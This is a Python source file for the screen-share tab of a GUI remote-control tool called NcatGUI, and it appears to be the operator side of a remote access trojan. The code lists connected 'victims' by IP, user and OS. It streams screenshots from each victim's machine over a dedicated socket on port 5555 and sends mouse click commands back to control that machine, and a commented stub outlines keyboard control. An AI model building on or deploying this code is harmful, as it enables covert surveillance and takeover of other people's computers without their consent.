# ScreenShareTab.py

import customtkinter as ctk
import tkinter as tk
from PIL import Image, ImageTk, UnidentifiedImageError
import threading
import socket
import struct
from io import BytesIO
import time

class ScreenShareTab(ctk.CTkFrame):
    def __init__(self, parent, app, colors):
        """
        Initializes the Screen Share Tab.
        Args:
            parent: The parent widget (CTkTabview tab).
            app: The main NcatGUI application instance.
            colors: Dictionary of color codes.
        """
        super().__init__(parent, fg_color=colors["bg_secondary"])
        self.app = app
        self.colors = colors

        # --- Internal State ---
        self.selected_connection_id = None
        self.current_streaming_conn_id = None
        self.streaming_active = False
        self.stream_thread = None
        self.screen_photo_image = None
        self.client_width = 1
        self.client_height = 1
        self.stream_socket = None # <<<--- Add a variable for the dedicated stream socket
        self.victim_stream_port = 5555 # <<<--- Port the Victim listens on for screen share

        # --- UI Elements ---
        self.setup_ui()
        self.update_connection_list()

    # --- Keep setup_ui as is ---
    def setup_ui(self):
        # ... (no changes needed here) ...
        # Configure grid layout for the tab frame itself
        self.grid_columnconfigure(0, weight=1) # Make main area expandable
        self.grid_rowconfigure(1, weight=1)    # Make image display area expandable

        # === Control Frame (Top) ===
        self.control_frame = ctk.CTkFrame(self, fg_color=self.colors["bg_primary"], corner_radius=5)
        self.control_frame.grid(row=0, column=0, sticky="ew", padx=10, pady=(10, 5))
        self.control_frame.grid_columnconfigure(1, weight=0) # Don't let dropdown expand excessively initially

        # Connection Selector Label
        self.conn_label = ctk.CTkLabel(self.control_frame, text="View Connection:", text_color=self.colors["text_accent"])
        self.conn_label.grid(row=0, column=0, padx=(10, 5), pady=10, sticky="w")

        # Connection Selector Dropdown
        self.connection_var = ctk.StringVar(value="Select...")
        self.connection_dropdown = ctk.CTkOptionMenu(
            self.control_frame,
            variable=self.connection_var,
            values=["Select..."],
            command=self.on_connection_selected,
            fg_color=self.colors["bg_secondary"],
            button_color=self.colors["accent_primary"],
            button_hover_color=self.colors["accent_secondary"],
            dropdown_fg_color=self.colors["bg_primary"],
            dropdown_hover_color=self.colors["bg_secondary"],
            text_color=self.colors["text_primary"],
            width=250 # Give it a decent starting width
        )
        self.connection_dropdown.grid(row=0, column=1, padx=5, pady=10, sticky="w")

        # Start Viewing Button
        self.start_button = ctk.CTkButton(
            self.control_frame,
            text="Start View",
            command=self.start_viewing,
            state="disabled",
            fg_color=self.colors["accent_success"],
            hover_color="#3B8E7A", # Darker cyan/green
            text_color=self.colors["text_primary"]
        )
        self.start_button.grid(row=0, column=2, padx=5, pady=10, sticky="w")

        # Stop Viewing Button
        self.stop_button = ctk.CTkButton(
            self.control_frame,
            text="Stop View",
            command=self.stop_viewing,
            state="disabled",
            fg_color=self.colors["accent_danger"],
            hover_color="#CC3D3D", # Darker red
            text_color=self.colors["text_primary"]
        )
        self.stop_button.grid(row=0, column=3, padx=5, pady=10, sticky="w")

        # === Screen Display Frame (Main Area) ===
        self.screen_frame = ctk.CTkFrame(self, fg_color=self.colors["bg_primary"], corner_radius=5)
        self.screen_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=(5, 10))
        self.screen_frame.grid_columnconfigure(0, weight=1)
        self.screen_frame.grid_rowconfigure(0, weight=1)

        # Image Display Label (Using tk.Label for performance)
        self.image_label = tk.Label(self.screen_frame, bg=self.colors["bg_primary"])
        self.image_label.grid(row=0, column=0, sticky="nsew")

        # Bind mouse events for interaction
        self.image_label.bind("<Button-1>", self.on_mouse_event)       # Left click
        self.image_label.bind("<Button-3>", self.on_mouse_event)       # Right click
        self.image_label.bind("<Double-Button-1>", self.on_mouse_event)# Double left click
        # Add B1-Motion for drag? Might be too much network traffic unless optimized.
        # Keyboard binding would likely need focus management on the frame/tab
        # self.bind("<KeyPress>", self.on_key_press) # Example


    # --- Keep update_connection_list, on_connection_selected, control enabling/disabling as is ---
    def update_connection_list(self):
        # ... (no changes needed here) ...
        """Updates the connection dropdown menu based on active connections in the main app."""
        active_conns_display = ["Select..."]
        self.active_conn_map = {} # Map display string back to conn_id

        # Sort by connection ID for consistent order
        # FIX: Handle potential non-integer keys or missing info gracefully
        valid_conn_ids = []
        if hasattr(self.app, 'connection_info') and self.app.connection_info:
             valid_conn_ids = sorted([k for k in self.app.connection_info.keys() if isinstance(k, int)])
        # else: # If connection_info doesn't exist yet or is empty
        #      pass # valid_conn_ids remains empty


        # sorted_conn_ids = sorted(self.app.connection_info.keys()) # Old way

        for conn_id in valid_conn_ids: # Use filtered list
             # FIX: Check both active_connections and connection_info
             if hasattr(self.app, 'active_connections') and conn_id in self.app.active_connections and conn_id in self.app.connection_info:
                 info = self.app.connection_info[conn_id]
                 # FIX: Provide defaults more robustly
                 ip = info.get('ip', 'N/A')
                 port = info.get('port', 'N/A')
                 user = info.get('user', 'Unknown')
                 os_info = info.get('os', 'OS?') # Added OS for clarity
                 display_str = f"{ip}:{port} ({user}@{os_info} - ID: {conn_id})"
                 active_conns_display.append(display_str)
                 self.active_conn_map[display_str] = conn_id

        # Update dropdown, preserving selection if possible
        current_selection_display = self.connection_var.get()
        self.connection_dropdown.configure(values=active_conns_display)

        if current_selection_display in self.active_conn_map:
            selected_id = self.active_conn_map[current_selection_display]
            self.connection_var.set(current_selection_display)
            # Re-enable controls if selection is still valid and not actively streaming *this* connection
            # FIX: Check if selected_id is still considered active by main app
            is_still_active = hasattr(self.app, 'active_connections') and selected_id in self.app.active_connections
            if is_still_active:
                if self.streaming_active and selected_id == self.current_streaming_conn_id:
                     self.set_streaming_controls() # If streaming this one, set stop enabled
                else:
                     self.enable_start_controls() # Not streaming or different one selected, enable start
            else:
                # Selected connection is no longer active, disable controls
                self.connection_var.set("Select...")
                self.selected_connection_id = None
                self.disable_all_controls()

        else:
            self.connection_var.set("Select...")
            self.selected_connection_id = None
            self.disable_all_controls()

    def on_connection_selected(self, selection_display):
        # ... (no changes needed here) ...
        """Handles the event when a connection is selected from the dropdown."""
        if selection_display == "Select..." or selection_display not in self.active_conn_map:
            self.selected_connection_id = None
            self.disable_all_controls()
            # If streaming was active for a *different* connection, stop it
            if self.streaming_active:
                # FIX: Check if we *were* streaming something before stopping
                old_stream_id = self.current_streaming_conn_id
                if old_stream_id is not None:
                    self.stop_viewing()

        else:
            newly_selected_id = self.active_conn_map[selection_display]
            # FIX: Ensure the selected ID is still active before setting
            is_still_active = hasattr(self.app, 'active_connections') and newly_selected_id in self.app.active_connections
            if not is_still_active:
                self.app.update_console(f"ScreenShare: Selected connection {newly_selected_id} is no longer active.", "warning")
                self.update_connection_list() # Refresh the list
                return

            self.selected_connection_id = newly_selected_id

            if self.streaming_active:
                # If streaming is active, but for a different connection
                if self.current_streaming_conn_id != self.selected_connection_id:
                    self.stop_viewing() # Stop the old stream first
                    self.enable_start_controls() # Enable start for the new selection
                else:
                    # Streaming is already active for this connection, ensure stop is enabled
                    self.set_streaming_controls()
            else:
                # No stream active, enable the start button for this selection
                self.enable_start_controls()

    def enable_start_controls(self):
        # ... (no changes needed here) ...
        """Enable start button, disable stop button."""
        # FIX: Check if a valid connection is actually selected
        if self.selected_connection_id is not None:
            self.start_button.configure(state="normal")
        else:
            self.start_button.configure(state="disabled")
        self.stop_button.configure(state="disabled")


    def disable_all_controls(self):
        # ... (no changes needed here) ...
        """Disable both start and stop buttons."""
        self.start_button.configure(state="disabled")
        self.stop_button.configure(state="disabled")

    def set_streaming_controls(self):
        # ... (no changes needed here) ...
        """Disable start button, enable stop button (when streaming)."""
        self.start_button.configure(state="disabled")
        self.stop_button.configure(state="normal")

    # --- Streaming Logic Modifications ---

    def start_viewing(self):
        """Starts the screen viewing session by connecting to the Victim's stream port."""
        if self.selected_connection_id is None:
            self.app.update_console("ScreenShare: No connection selected.", "warning")
            return

        # FIX: Re-check if selected connection is still active before proceeding
        conn_id = self.selected_connection_id
        if not hasattr(self.app, 'active_connections') or conn_id not in self.app.active_connections:
             self.app.update_console(f"ScreenShare: Connection {conn_id} is no longer active. Cannot start view.", "warning")
             self.update_connection_list()
             self.disable_all_controls()
             return

        if self.streaming_active:
            # FIX: Be more specific if already viewing the *same* connection
            if self.current_streaming_conn_id == conn_id:
                 self.app.update_console(f"ScreenShare: Already viewing connection {self.current_streaming_conn_id}.", "info")
            else:
                 self.app.update_console(f"ScreenShare: Already viewing connection {self.current_streaming_conn_id}. Stop it first.", "warning")
            return # Should be handled by button state, but safety check

        # --- Get Victim IP ---
        # conn_id = self.selected_connection_id # Already assigned above
        if conn_id not in self.app.connection_info:
            self.app.update_console(f"ScreenShare: Cannot get info for connection {conn_id}.", "error")
            self.update_connection_list() # Refresh list
            self.disable_all_controls()
            return
        victim_ip = self.app.connection_info[conn_id].get('ip')
        if not victim_ip:
             self.app.update_console(f"ScreenShare: IP address not found for connection {conn_id}.", "error")
             return

        self.app.update_console(f"ScreenShare: Attempting to connect to {victim_ip}:{self.victim_stream_port} for connection {conn_id}...", "info")

        # FIX: Ensure any previous stream socket is definitely closed/None
        if self.stream_socket is not None:
            self.app.update_console(f"ScreenShare: Warning - Found existing stream_socket before starting. Closing it.", "warning")
            try:
                self.stream_socket.close()
            except Exception: pass
            self.stream_socket = None

        try:
            # --- Establish NEW connection for streaming ---
            self.stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.stream_socket.settimeout(5.0) # Timeout for connection attempt
            self.stream_socket.connect((victim_ip, self.victim_stream_port))
            # FIX: Longer timeout for receiving might be needed if frames are large/network slow
            self.stream_socket.settimeout(3.0) # Timeout for receiving data later (increased from 1.0)
            self.app.update_console(f"ScreenShare: Connected to stream port for {conn_id}.", "success")

            # --- Start receiver thread with the NEW socket ---
            self.streaming_active = True # Set active *before* starting thread
            self.current_streaming_conn_id = conn_id
            # Pass the new stream_socket to the thread
            self.stream_thread = threading.Thread(target=self._receive_loop, args=(conn_id, self.stream_socket), daemon=True)
            self.stream_thread.start()

            # Send the initial SCREEN request over the NEW socket
            # FIX: Add small delay before first request to allow victim server maybe?
            time.sleep(0.1)
            self._request_next_frame(conn_id, self.stream_socket)

            self.set_streaming_controls()

        except socket.timeout:
            self.app.update_console(f"ScreenShare: Timeout connecting to {victim_ip}:{self.victim_stream_port}", "error")
            if self.stream_socket:
                 try: self.stream_socket.close()
                 except Exception: pass
            self.stream_socket = None
            # FIX: Reset state fully on connection failure
            self.streaming_active = False
            self.current_streaming_conn_id = None
            self.enable_start_controls() # Enable start only if the selection is still valid
            self.update_connection_list() # Refresh state

        except ConnectionRefusedError:
             self.app.update_console(f"ScreenShare: Connection refused by {victim_ip}:{self.victim_stream_port}. Is the victim listener running and accepting connections?", "error")
             if self.stream_socket:
                  try: self.stream_socket.close()
                  except Exception: pass
             self.stream_socket = None
             # FIX: Reset state fully on connection failure
             self.streaming_active = False
             self.current_streaming_conn_id = None
             self.enable_start_controls() # Enable start only if the selection is still valid
             self.update_connection_list() # Refresh state

        except Exception as e:
            self.app.update_console(f"ScreenShare: Error connecting to stream port for {conn_id}: {e}", "error")
            if self.stream_socket:
                 try: self.stream_socket.close()
                 except Exception: pass
            self.stream_socket = None
            self.streaming_active = False
            self.current_streaming_conn_id = None
            # FIX: Ensure start controls are enabled only if appropriate
            self.update_connection_list() # Refresh state and controls
            # self.enable_start_controls() # Old - update_connection_list handles this better


    def stop_viewing(self):
        """Stops the screen viewing session and closes the dedicated stream socket."""
        if not self.streaming_active or self.current_streaming_conn_id is None:
            # FIX: Maybe log if stop is called unnecessarily
            # print(f"ScreenShare: Stop called but not active or no current ID.")
            return

        conn_id = self.current_streaming_conn_id
        self.app.update_console(f"ScreenShare: Stopping view for connection {conn_id}...", "info")

        # --- Signal the thread to stop FIRST ---
        self.streaming_active = False
        stopping_conn_id = self.current_streaming_conn_id
        self.current_streaming_conn_id = None # Clear this early

        # --- Close the dedicated stream socket ---
        sock_to_close = self.stream_socket # Use a temporary variable
        self.stream_socket = None # Set to None immediately

        if sock_to_close:
            try:
                # Optional: Send a polite close message if victim expects one
                # sock_to_close.sendall(b"CLOSE_STREAM")
                sock_to_close.shutdown(socket.SHUT_RDWR)
            except OSError as e:
                # Ignore "not connected" or "not a socket" errors during shutdown
                if e.errno not in (10057, 10038, 9): # WSAENOTCONN, WSAENOTSOCK, EBADF
                     self.app.update_console(f"ScreenShare: Error shutting down stream socket {stopping_conn_id}: {e}", "warning")
            except Exception as e:
                self.app.update_console(f"ScreenShare: Error shutting down stream socket {stopping_conn_id}: {e}", "warning")
            finally:
                 try:
                     sock_to_close.close()
                     self.app.update_console(f"ScreenShare: Stream socket for {stopping_conn_id} closed.", "info")
                 except Exception as e:
                      self.app.update_console(f"ScreenShare: Error closing stream socket {stopping_conn_id}: {e}", "warning")
                 # sock_to_close = None # No need, it's a local variable

        # Wait briefly for the thread to potentially finish processing the stop signal
        # FIX: Added join with timeout
        if self.stream_thread and self.stream_thread.is_alive():
             self.stream_thread.join(timeout=0.5) # Wait max 0.5 seconds
             if self.stream_thread.is_alive():
                  self.app.update_console(f"ScreenShare: Warning - Stream thread for {stopping_conn_id} did not exit quickly.", "warning")
        self.stream_thread = None


        # Clean up GUI
        self.image_label.config(image='')
        self.screen_photo_image = None

        # Reset controls based on currently selected connection in dropdown
        # FIX: Let update_connection_list handle the UI state refresh correctly
        self.update_connection_list()
        # --- Old logic replaced by update_connection_list() ---
        # current_selection_display = self.connection_var.get()
        # if current_selection_display in self.active_conn_map:
        #      self.selected_connection_id = self.active_conn_map[current_selection_display]
        #      # Check if the selected one is the one we just stopped
        #      if self.selected_connection_id == stopping_conn_id:
        #          self.enable_start_controls()
        #      else:
        #          # We stopped streaming A, but B is selected in dropdown.
        #          # Check if B is active, if so, enable start.
        #          if self.selected_connection_id in self.app.active_connections:
        #               self.enable_start_controls()
        #          else: # B is selected but no longer active
        #               self.disable_all_controls()
        # else:
        #      self.selected_connection_id = None
        #      self.disable_all_controls()


    def _request_next_frame(self, conn_id, sock_to_use):
        """Sends the 'SCREEN' command over the specified socket."""
        # FIX: Check socket validity more carefully before sending
        # Ensure we are still streaming *this* connection and the socket is valid
        if self.streaming_active and conn_id == self.current_streaming_conn_id and sock_to_use and sock_to_use.fileno() != -1:
            try:
                sock_to_use.sendall(b"SCREEN") # Use sendall for reliability
            except socket.error as send_err: # Catch socket specific errors
                # FIX: Check if the error is expected due to stopping
                if self.streaming_active: # Only log if we weren't expecting it
                     self.app.update_console(f"ScreenShare: Socket error requesting frame from {conn_id}: {send_err}", "error")
                     self.after(0, self._handle_stream_disconnect, conn_id) # Schedule stop
            except Exception as e:
                 # FIX: Check if the error is expected due to stopping
                 if self.streaming_active: # Only log if we weren't expecting it
                     self.app.update_console(f"ScreenShare: Unexpected error requesting frame from {conn_id}: {e}", "error")
                     self.after(0, self._handle_stream_disconnect, conn_id) # Schedule stop
        # else:
             # Optional: Log if request is skipped due to state?
             # print(f"ScreenShare: Skipping frame request for {conn_id}, state: active={self.streaming_active}, current={self.current_streaming_conn_id}, sock={sock_to_use}")


    # Modify _receive_loop to accept and use the stream_socket
    def _receive_loop(self, conn_id, stream_sock): # Takes stream_sock as argument
        """Background thread to receive and display screen frames over the dedicated stream socket."""
        buffer = b''
        payload_size = struct.calcsize(">L") # 4 bytes for unsigned long, big-endian

        try:
            while self.streaming_active and conn_id == self.current_streaming_conn_id:
                # 1. Receive the size prefix using stream_sock
                data_received_this_cycle = False
                # FIX: More robust check for stopping *before* recv
                if not (self.streaming_active and conn_id == self.current_streaming_conn_id): return

                while len(buffer) < payload_size:
                    # FIX: Check state again inside inner loop
                    if not (self.streaming_active and conn_id == self.current_streaming_conn_id): return
                    try:
                        # Use the passed stream_sock
                        # FIX: Add check for socket validity just before recv
                        if not stream_sock or stream_sock.fileno() == -1:
                             raise ConnectionError("Stream socket closed before receiving size.")

                        chunk = stream_sock.recv(4096) # Read up to 4k
                        if not chunk:
                            # Peer closed connection gracefully
                            raise ConnectionError("Stream connection closed by peer while receiving size.")
                        buffer += chunk
                        data_received_this_cycle = True
                    except socket.timeout:
                         # Timeout is okay, just continue waiting unless streaming stopped
                         # If we timed out and received NO data, just continue waiting.
                         if not data_received_this_cycle:
                              # FIX: Add a small sleep to prevent high CPU usage on repeated timeouts
                              time.sleep(0.05)
                              continue
                         else:
                              # We got *some* data before timeout, maybe it's enough now? Break inner recv loop.
                              break
                    except ConnectionError as ce: # Catch specific connection errors (peer closed, socket closed locally)
                        raise ce # Re-raise to be caught by outer handler
                    except socket.error as se:
                         # Check if error is due to socket being closed by stop_viewing
                         if not self.streaming_active: return # Expected closure, exit loop cleanly
                         # Otherwise, it's an unexpected socket error
                         # FIX: Wrap the original error number for better debugging
                         raise ConnectionError(f"Socket error receiving size (errno {se.errno}): {se}")
                    except Exception as e:
                         # Catch other unexpected errors
                         if not self.streaming_active: return # Exit if stopping
                         raise ConnectionError(f"Unexpected error receiving size: {e}")

                # Check if we actually got enough data for the size prefix after the inner loop
                if len(buffer) < payload_size:
                    # FIX: Check state before logging incomplete size
                    if self.streaming_active and conn_id == self.current_streaming_conn_id:
                        # Didn't get enough data (e.g., connection closed prematurely)
                        self.app.update_console(f"ScreenShare: Incomplete size prefix received from {conn_id} (got {len(buffer)} bytes).", "warning")
                        # FIX: Don't immediately request next frame, let the outer loop handle potential disconnect
                        raise ConnectionError("Incomplete size prefix received.")
                    else:
                        return # Streaming stopped while waiting

                # We have enough data for the size prefix
                packed_msg_size = buffer[:payload_size]
                buffer = buffer[payload_size:] # Keep the rest of the buffer
                try:
                    msg_size = struct.unpack(">L", packed_msg_size)[0]
                except struct.error as e:
                     # This should be rare if payload_size is correct, but handle it
                     self.app.update_console(f"ScreenShare: Error unpacking frame size from {conn_id}: {e}. Data: {packed_msg_size!r}", "error")
                     buffer = b'' # Clear potentially corrupted buffer
                     # Don't request again immediately, let the ConnectionError handler below trigger stop
                     raise ConnectionError(f"Failed to unpack frame size: {e}")

                # --- Sanity check size ---
                # FIX: Check *before* trying to receive the (potentially huge) frame data
                # Allow slightly larger frames? Up to 20MB?
                max_frame_size = 20 * 1024 * 1024
                if not (0 < msg_size <= max_frame_size):
                    self.app.update_console(f"ScreenShare: Invalid frame size received from {conn_id}: {msg_size} (bytes). Expected 0 < size <= {max_frame_size}.", "warning")
                    # FIX: Aggressively clear buffer and request next frame, hoping it recovers.
                    # This is where the loop of "Invalid frame size" was happening.
                    # Maybe the victim sent garbage *once*, clearing buffer might help.
                    self.app.update_console(f"ScreenShare: Discarding buffer and requesting next frame for {conn_id}.", "info")
                    buffer = b'' # Discard everything received so far for this frame
                    self._request_next_frame(conn_id, stream_sock)
                    time.sleep(0.1) # Small delay before next attempt
                    continue # Skip to next iteration of the outer while loop

                # 2. Receive the image data using stream_sock
                data_received_this_cycle = False
                # FIX: Check state before inner loop
                if not (self.streaming_active and conn_id == self.current_streaming_conn_id): return

                while len(buffer) < msg_size:
                    # FIX: Check state again inside inner loop
                    if not (self.streaming_active and conn_id == self.current_streaming_conn_id): return
                    try:
                        # FIX: Check socket validity
                        if not stream_sock or stream_sock.fileno() == -1:
                             raise ConnectionError("Stream socket closed before receiving frame data.")

                        # Calculate remaining bytes needed, read up to a larger chunk size
                        needed = msg_size - len(buffer)
                        read_amount = min(65536, needed) # Read up to 64k
                        chunk = stream_sock.recv(read_amount)
                        if not chunk:
                             raise ConnectionError("Stream connection closed by peer during frame receive.")
                        buffer += chunk
                        data_received_this_cycle = True
                    except socket.timeout:
                        if not data_received_this_cycle:
                             time.sleep(0.05)
                             continue
                        else:
                             break # Break inner loop if timeout occurred after some data received
                    except ConnectionError as ce:
                        raise ce
                    except socket.error as se:
                         if not self.streaming_active: return # Expected closure
                         raise ConnectionError(f"Socket error receiving frame data (errno {se.errno}): {se}")
                    except Exception as e:
                         if not self.streaming_active: return # Exit if stopping
                         raise ConnectionError(f"Unexpected error receiving frame data: {e}")

                if len(buffer) < msg_size:
                     if self.streaming_active and conn_id == self.current_streaming_conn_id:
                          self.app.update_console(f"ScreenShare: Incomplete frame data received from {conn_id} (expected {msg_size}, got {len(buffer)}).", "warning")
                          # FIX: Don't request next frame, signal disconnect
                          raise ConnectionError("Incomplete frame data received.")
                     else: return # Streaming stopped

                # We have the complete frame data
                frame_data = buffer[:msg_size]
                buffer = buffer[msg_size:] # Keep remainder for next message

                # 3. Decode and display
                try:
                    image = Image.open(BytesIO(frame_data))
                    # Update client size info (important for coordinate scaling)
                    self.client_width, self.client_height = image.size

                    # Resize image to fit the label while maintaining aspect ratio
                    label_width = self.image_label.winfo_width()
                    label_height = self.image_label.winfo_height()

                    # Check for valid label dimensions
                    if label_width > 1 and label_height > 1 and self.client_width > 0 and self.client_height > 0:
                        img_aspect = self.client_width / self.client_height
                        lbl_aspect = label_width / label_height

                        if img_aspect > lbl_aspect: # Image is wider rel. to label -> fit width
                            new_width = label_width
                            new_height = int(new_width / img_aspect)
                        else: # Image is taller rel. to label -> fit height
                            new_height = label_height
                            new_width = int(new_height * img_aspect)

                        # Ensure dimensions are at least 1x1
                        new_width = max(1, new_width)
                        new_height = max(1, new_height)

                        # FIX: Use ANTIALIAS or BICUBIC for potentially better quality/performance trade-off? LANCZOS is high quality but slower.
                        # resized_image = image.resize((new_width, new_height), Image.Resampling.LANCZOS)
                        resized_image = image.resize((new_width, new_height), Image.Resampling.BICUBIC) # Changed resampling
                        tk_image = ImageTk.PhotoImage(resized_image)
                    else:
                        # Fallback if label size is invalid: display original size
                        # Limit size slightly to prevent huge unscaled images? Optional.
                        # max_dim = 1000
                        # if image.width > max_dim or image.height > max_dim:
                        #      image.thumbnail((max_dim, max_dim))
                        tk_image = ImageTk.PhotoImage(image)

                    # Keep a reference to the PhotoImage to prevent garbage collection!
                    self.screen_photo_image = tk_image
                    # Update the label in the main GUI thread using 'after'
                    # FIX: Ensure label still exists before configuring
                    if self.image_label.winfo_exists():
                         self.after(0, lambda: self.image_label.config(image=self.screen_photo_image))

                except UnidentifiedImageError: # More specific error
                    self.app.update_console(f"ScreenShare: Received invalid/corrupt image data from {conn_id}. Skipping frame.", "warning")
                    # Don't stop streaming for one bad frame, but clear buffer
                    buffer = b''
                except Exception as decode_err:
                    self.app.update_console(f"ScreenShare: Error decoding/displaying frame from {conn_id}: {decode_err}", "error")
                    # Don't necessarily stop, but clear buffer
                    buffer = b''

                # 4. Request the next frame OVER THE STREAM SOCKET
                # FIX: Add slight delay before requesting next? Prevents overwhelming victim?
                time.sleep(0.02) # 20ms delay
                self._request_next_frame(conn_id, stream_sock)

                # Optional sleep (can remove if network latency is sufficient)
                # time.sleep(0.01) # Already added delay before request

        except ConnectionError as ce:
            # This catches errors raised explicitly above (peer close, socket error, incomplete data, unpack error)
            # FIX: Only log if we were *supposed* to be streaming
            if conn_id == getattr(self, '_last_disconnected_id_logged', None): return # Avoid duplicate logs if disconnect handler runs fast
            if self.streaming_active and conn_id == self.current_streaming_conn_id:
                self.app.update_console(f"ScreenShare: Stream connection {conn_id} error: {ce}", "warning")
                setattr(self, '_last_disconnected_id_logged', conn_id) # Mark as logged
            self.after(0, self._handle_stream_disconnect, conn_id)
        except KeyError:
            # This might happen if app.connection_info gets cleared somehow
            self.app.update_console(f"ScreenShare: Connection {conn_id} info no longer exists (KeyError). Stopping stream.", "warning")
            self.after(0, self._handle_stream_disconnect, conn_id)
        except Exception as e:
             # Catch truly unexpected errors ONLY if we were meant to be streaming this conn_id
             # FIX: Check state more carefully before logging unexpected errors
             if conn_id == getattr(self, '_last_disconnected_id_logged', None): return # Avoid duplicate logs
             if self.streaming_active and conn_id == self.current_streaming_conn_id:
                 self.app.update_console(f"ScreenShare: Unhandled receive loop error for {conn_id}: {type(e).__name__} - {e}", "error")
                 setattr(self, '_last_disconnected_id_logged', conn_id) # Mark as logged
             self.after(0, self._handle_stream_disconnect, conn_id) # Still try to disconnect cleanly
        finally:
             # Ensure stream socket timeout is reset if changed (though we set it once on connect)
             # if stream_sock: try: stream_sock.settimeout(None) except: pass
             print(f"ScreenShare: Receive loop for {conn_id} ended.")


    def _handle_stream_disconnect(self, disconnected_conn_id):
        """Handles UI updates when a stream disconnects unexpectedly or is stopped."""
        # Prevent recursive calls or multiple stops for the same ID
        if disconnected_conn_id == getattr(self, '_last_handled_disconnect_id', None):
            # print(f"ScreenShare: Already handled disconnect for {disconnected_conn_id}")
            return
        setattr(self, '_last_handled_disconnect_id', disconnected_conn_id)

        # Only stop if the disconnected stream is the one we *thought* we were actively viewing
        # Use a local check as self.current_streaming_conn_id might be cleared by stop_viewing already
        should_stop_ui = self.streaming_active and disconnected_conn_id == self.current_streaming_conn_id

        # Call stop_viewing regardless to ensure cleanup, but check if active first
        if self.streaming_active and disconnected_conn_id == self.current_streaming_conn_id:
             # print(f"ScreenShare: Handling disconnect for active stream {disconnected_conn_id}. Calling stop_viewing.")
             self.stop_viewing() # This will call update_connection_list
        else:
             # Stream might have already been stopped, or it's for an old conn_id.
             # Just refresh the UI state.
             # print(f"ScreenShare: Handling disconnect for inactive/old stream {disconnected_conn_id}. Updating list.")
             self.update_connection_list()

        # Clean up the temporary attribute after a short delay
        self.after(1000, lambda: delattr(self, '_last_handled_disconnect_id') if hasattr(self, '_last_handled_disconnect_id') else None)


    # --- Interaction Logic Modifications ---

    def on_mouse_event(self, event):
        """Handles mouse clicks and sends command over the dedicated stream socket."""
        # FIX: Check socket validity more carefully
        if not self.streaming_active or self.current_streaming_conn_id is None or self.stream_socket is None or self.stream_socket.fileno() == -1:
            return

        conn_id = self.current_streaming_conn_id # Use the ID we are streaming

        # --- Coordinate calculation remains the same ---
        # FIX: Add safety checks for dimensions
        label_width = self.image_label.winfo_width()
        label_height = self.image_label.winfo_height()
        client_w = self.client_width
        client_h = self.client_height

        if label_width <= 1 or label_height <= 1 or client_w <= 0 or client_h <= 0: # client dims can be 0 temporarily
            # print("ScreenShare: Invalid dimensions for mouse event.")
            return

        click_x_label = event.x
        click_y_label = event.y

        # Avoid division by zero if client height is somehow zero
        if client_h == 0: return
        img_aspect = client_w / client_h
        lbl_aspect = label_width / label_height

        # Calculate display geometry within the label
        if img_aspect > lbl_aspect: # Image wider than label aspect ratio (letterboxed top/bottom)
            displayed_width = label_width
            displayed_height = int(displayed_width / img_aspect) if img_aspect != 0 else 0
            pad_x = 0
            pad_y = (label_height - displayed_height) // 2
        else: # Image taller than label aspect ratio (pillarboxed left/right)
            displayed_height = label_height
            displayed_width = int(displayed_height * img_aspect)
            pad_x = (label_width - displayed_width) // 2
            pad_y = 0

        # Ensure displayed dimensions are valid before proceeding
        if displayed_width <= 0 or displayed_height <= 0:
            # print("ScreenShare: Invalid calculated display dimensions.")
            return

        # Click coordinates relative to the *displayed* image
        click_x_image = click_x_label - pad_x
        click_y_image = click_y_label - pad_y

        # Check if click is within the bounds of the displayed image
        if not (0 <= click_x_image < displayed_width and 0 <= click_y_image < displayed_height):
            # print("ScreenShare: Click outside displayed image bounds.")
            return

        # Calculate scaling factors
        scale_x = client_w / displayed_width
        scale_y = client_h / displayed_height

        # Calculate target coordinates on the original client screen
        target_x = int(click_x_image * scale_x)
        target_y = int(click_y_image * scale_y)

        # Clamp coordinates to client screen bounds
        target_x = max(0, min(target_x, client_w))
        target_y = max(0, min(target_y, client_h))

        action = None
        event_type_str = str(event.type) # Use string representation for broader compatibility

        if event.num == 1: # Left button
             if event_type_str == '4': # ButtonPress
                 action = "click"
             elif event_type_str == '7': # Double-ButtonPress
                 action = "double_click"
        elif event.num == 3: # Right button
             if event_type_str == '4': # ButtonPress
                 action = "right_click"

        if action:
            command = f"MOUSE|{target_x}|{target_y}|{action}"
            # --- Send over STREAM socket ---
            try:
                # FIX: Re-check socket validity just before sending
                if self.stream_socket and self.stream_socket.fileno() != -1:
                     self.stream_socket.sendall(command.encode('utf-8'))
                else:
                     # Socket closed between check and send, handle disconnect
                     raise socket.error("Socket closed before sending mouse command")

            except socket.error as e: # Catch socket errors specifically
                # FIX: Check if streaming is still supposed to be active before logging/disconnecting
                if self.streaming_active and conn_id == self.current_streaming_conn_id:
                     self.app.update_console(f"ScreenShare: Socket error sending mouse command to {conn_id}: {e}", "error")
                     self.after(0, self._handle_stream_disconnect, conn_id) # Schedule stop
            except Exception as e:
                 if self.streaming_active and conn_id == self.current_streaming_conn_id:
                     self.app.update_console(f"ScreenShare: Unexpected error sending mouse command to {conn_id}: {e}", "error")
                     self.after(0, self._handle_stream_disconnect, conn_id)

    # --- Add similar logic for on_key_event if implementing keyboard control ---
    # def on_key_event(self, event):
    #     if not self.streaming_active or self.current_streaming_conn_id is None or self.stream_socket is None: return
    #     conn_id = self.current_streaming_conn_id
    #     # ... determine key_input (special vs normal) ...
    #     command = f"KEY|{key_input}"
    #     try:
    #          self.stream_socket.sendall(command.encode('utf-8'))
    #     except Exception as e:
    #          # ... error handling ...

    # --- Public Methods (Called from main app) ---

    def connection_added(self, conn_id, info):
        """Callback when a new connection is established in the main app."""
        # FIX: Use after(0, ...) for thread safety when updating UI from external calls
        self.after(0, self.update_connection_list)

    def connection_removed(self, conn_id):
        """Callback when a connection is removed in the main app."""
        # FIX: Use after(0, ...)
        def update_ui_on_remove():
             # If the removed connection was being viewed via stream_socket, stop it
             # FIX: Check current_streaming_conn_id directly
             if self.current_streaming_conn_id == conn_id:
                 self.stop_viewing() # stop_viewing handles UI updates now
             else:
                 # If not actively streaming the removed one, just update list
                 self.update_connection_list()
        self.after(0, update_ui_on_remove)

    def add_ip(self, ip): # This method seems misplaced in original code - likely not needed here
        """Callback when a new IP is added? (Purpose unclear)"""
        # FIX: This seems unused, but keeping it and making it thread-safe
        # It likely should have been passed conn_id, not ip
        # print(f"ScreenShareTab: add_ip called with {ip} - likely needs review.")
        self.after(0, self.update_connection_list) # Update list if needed